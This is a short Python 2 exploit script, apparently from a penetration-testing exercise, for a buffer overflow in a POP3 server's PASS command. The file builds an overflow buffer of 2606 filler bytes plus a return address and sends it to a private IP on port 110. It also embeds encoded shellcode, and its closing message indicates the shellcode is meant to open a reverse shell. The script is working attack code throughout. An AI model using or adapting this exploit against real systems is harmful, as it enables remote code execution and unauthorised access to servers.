#!/usr/bin/python
import socket

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

shellcode = ("\xda\xd9\xbd\xfc\xb8\xa4\x79\xd9\x74\x24\xf4\x58\x31\xc9\xb1"
"\x52\x31\x68\x17\x83\xe8\xfc\x03\x94\xab\x46\x8c\x98\x24\x04"
"\x6f\x60\xb5\x69\xf9\x85\x84\xa9\x9d\xce\xb7\x19\xd5\x82\x3b"
"\xd1\xbb\x36\xcf\x97\x13\x39\x78\x1d\x42\x74\x79\x0e\xb6\x17"
"\xf9\x4d\xeb\xf7\xc0\x9d\xfe\xf6\x05\xc3\xf3\xaa\xde\x8f\xa6"
"\x5a\x6a\xc5\x7a\xd1\x20\xcb\xfa\x06\xf0\xea\x2b\x99\x8a\xb4"
"\xeb\x18\x5e\xcd\xa5\x02\x83\xe8\x7c\xb9\x77\x86\x7e\x6b\x46"
"\x67\x2c\x52\x66\x9a\x2c\x93\x41\x45\x5b\xed\xb1\xf8\x5c\x2a"
"\xcb\x26\xe8\xa8\x6b\xac\x4a\x14\x8d\x61\x0c\xdf\x81\xce\x5a"
"\x87\x85\xd1\x8f\xbc\xb2\x5a\x2e\x12\x33\x18\x15\xb6\x1f\xfa"
"\x34\xef\xc5\xad\x49\xef\xa5\x12\xec\x64\x4b\x46\x9d\x27\x04"
"\xab\xac\xd7\xd4\xa3\xa7\xa4\xe6\x6c\x1c\x22\x4b\xe4\xba\xb5"
"\xac\xdf\x7b\x29\x53\xe0\x7b\x60\x90\xb4\x2b\x1a\x31\xb5\xa7"
"\xda\xbe\x60\x67\x8a\x10\xdb\xc8\x7a\xd1\x8b\xa0\x90\xde\xf4"
"\xd1\x9b\x34\x9d\x78\x66\xdf\x0e\x63\x6c\x94\x27\x9e\x6c\xba"
"\xa5\x17\x8a\xd0\xd9\x71\x05\x4d\x43\xd8\xdd\xec\x8c\xf6\x98"
"\x2f\x06\xf5\x5d\xe1\xef\x70\x4d\x96\x1f\xcf\x2f\x31\x1f\xe5"
"\x47\xdd\xb2\x62\x97\xa8\xae\x3c\xc0\xfd\x01\x35\x84\x13\x3b"
"\xef\xba\xe9\xdd\xc8\x7e\x36\x1e\xd6\x7f\xbb\x1a\xfc\x6f\x05"
"\xa2\xb8\xdb\xd9\xf5\x16\xb5\x9f\xaf\xd8\x6f\x76\x03\xb3\xe7"
"\x0f\x6f\x04\x71\x10\xba\xf2\x9d\xa1\x13\x43\xa2\x0e\xf4\x43"
"\xdb\x72\x64\xab\x36\x37\x94\xe6\x1a\x1e\x3d\xaf\xcf\x22\x20"
"\x50\x3a\x60\x5d\xd3\xce\x19\x9a\xcb\xbb\x1c\xe6\x4b\x50\x6d"
"\x77\x3e\x56\xc2\x78\x6b")

#buffer="A"*2606 + "\x8f\x35\x4a\x5f" + "\x90" * 16 + shellcode
buffer="A"*2606 + "\x8f\x35\x4a\x5f" + "C" * (3500-2606-4)

try:
	print "\nSending evil buffer..."
	s.connect(('172.31.2.202',110))
	data = s.recv(1024)
	s.send('USER username' +'\r\n')
	data = s.recv(1024)
	s.send('PASS ' + buffer + '\r\n')
	s.close()
	print "\ Done. Did you get a reverse shell?"
except:
	print "Could not connect to POP3!"
